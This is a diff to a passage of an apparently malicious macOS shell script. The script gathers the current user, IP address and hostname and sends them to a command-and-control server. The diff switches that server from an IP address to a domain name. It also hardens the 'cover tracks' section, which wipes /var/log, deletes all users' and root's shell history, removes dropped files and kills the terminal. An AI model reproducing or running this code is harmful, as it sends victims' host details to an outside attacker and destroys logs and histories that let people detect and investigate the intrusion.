@@ -18,7 +18,7 @@ USER=`stat -f "%Su" /dev/console` # Get user currently logged in (in GUI).
 IP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
 HOSTNAME=`hostname`
 
-SERVER="173.73.184.108"
+SERVER="boesen.science"
 PORT=2043
 
 # Send data to C&C
@@ -32,13 +32,14 @@ cat <&3
 echo
 
 # Get rid of files to cover tracks
-rm /tmp/elevate.out /tmp/*.sh
+# -f flag is used to suppress worrying but harmless errors if the file doesn't exist
+rm -f /tmp/elevate.out /tmp/*.sh
 
 rm -rf /var/log/*
-rm /var/root/.*history
-rm /Users/*/.*history
+rm -f /var/root/.*history
+rm -f /Users/*/.*history
 
-rm "/Users/${USER}/Downloads/term.*"
+rm -f "/Users/${USER}/Downloads/term.*"
 
 if [ "$USER" != "boesene" ]; then
     killall term
